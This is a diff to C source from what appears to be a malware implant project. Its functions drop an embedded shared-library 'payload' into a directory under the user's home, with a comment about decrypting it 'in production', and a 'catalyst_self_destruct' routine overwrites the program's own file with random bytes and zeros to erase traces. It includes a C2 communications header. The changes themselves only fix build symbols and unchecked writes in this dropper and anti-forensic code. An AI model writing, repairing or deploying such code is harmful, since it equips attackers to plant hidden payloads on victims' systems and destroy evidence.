@@ -26,7 +26,6 @@
  * ============================================================================
  */
 
-#define _GNU_SOURCE
 #include "../c2_comms/crypto.h"
 #include "../common/config.h"
 #include "../common/logging.h"
@@ -50,9 +49,9 @@
  *
  * For the template, we use a placeholder that the build system replaces.
  */
-extern const uint8_t _binary_nexus_auditor_so_start[];
-extern const uint8_t _binary_nexus_auditor_so_end[];
-extern const size_t _binary_nexus_auditor_so_size;
+extern const uint8_t _binary_build_nexus_auditor_so_start[];
+extern const uint8_t _binary_build_nexus_auditor_so_end[];
+extern const size_t _binary_build_nexus_auditor_so_size;
 
 /* ── Internal: Create directory path recursively ─────────────────────────── */
 
@@ -82,7 +81,7 @@ static aegis_result_t drop_auditor(const char *home, aegis_log_ctx_t *log) {
   mkdirp(auditor_dir, 0755);
 
   char auditor_path[512];
-  snprintf(auditor_path, sizeof(auditor_path), "%s%s", auditor_dir,
+  snprintf(auditor_path, sizeof(auditor_path), "%.490s%s", auditor_dir,
            AEGIS_AUDITOR_FILENAME);
 
   /* Check if already deployed */
@@ -105,9 +104,9 @@ static aegis_result_t drop_auditor(const char *home, aegis_log_ctx_t *log) {
    * In production: decrypt the embedded payload before writing.
    * Template: use the linker-embedded binary blob.
    */
-  const uint8_t *payload = _binary_nexus_auditor_so_start;
+  const uint8_t *payload = _binary_build_nexus_auditor_so_start;
   size_t payload_len =
-      (size_t)(_binary_nexus_auditor_so_end - _binary_nexus_auditor_so_start);
+      (size_t)(_binary_build_nexus_auditor_so_end - _binary_build_nexus_auditor_so_start);
 
   size_t written = 0;
   while (written < payload_len) {
@@ -224,12 +223,16 @@ static void catalyst_self_destruct(aegis_log_ctx_t *log) {
       for (int pass = 0; pass < 3; pass++) {
         aegis_random_bytes(buf, st.st_size);
         lseek(fd, 0, SEEK_SET);
-        write(fd, buf, st.st_size);
+        if (write(fd, buf, st.st_size) != (ssize_t)st.st_size) {
+          /* Ignore write error */
+        }
         fsync(fd);
       }
       memset(buf, 0, st.st_size);
       lseek(fd, 0, SEEK_SET);
-      write(fd, buf, st.st_size);
+      if (write(fd, buf, st.st_size) != (ssize_t)st.st_size) {
+        /* Ignore write error */
+      }
       fsync(fd);
       free(buf);
     }
